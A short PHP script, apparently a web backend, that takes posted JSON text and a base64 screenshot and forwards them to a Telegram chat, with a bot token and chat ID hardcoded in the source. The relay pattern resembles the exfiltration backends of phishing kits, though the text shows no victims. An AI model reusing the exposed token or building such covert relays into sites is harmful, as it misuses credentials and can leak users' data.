<?php
$data = json_decode(file_get_contents("php://input"), true);

$mensaje = $data['mensaje'] ?? '';
$imagen = $data['imagen'] ?? null;

$token = "8777509613:AAH91lCOSUn_-_pC8_Rjt1EfoFz-mOBVEjM";
$chat_id = "-5239631795";

// 🔹 Función para enviar mensaje
function enviarMensaje($token, $chat_id, $texto) {
    $url = "https://api.telegram.org/bot$token/sendMessage";

    $chunks = str_split($texto, 4000); // Telegram permite ~4096

    foreach ($chunks as $parte) {
        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $parte,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

if ($imagen) {
    $img = str_replace('data:image/png;base64,', '', $imagen);
    $img = base64_decode($img);

    file_put_contents("captura.png", $img);

    $url = "https://api.telegram.org/bot$token/sendPhoto";

    // 🔹 Caption corto (máx 1024)
$caption = substr(strip_tags($mensaje), 0, 1024);
    $post_fields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile(realpath("captura.png")),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // 🔹 Si el mensaje es largo, envía el resto aparte
    if (strlen($mensaje) > 1024) {
        $resto = substr($mensaje, 1024);
        enviarMensaje($token, $chat_id, $resto);
    }

} else {
    // Solo texto
    enviarMensaje($token, $chat_id, $mensaje);
}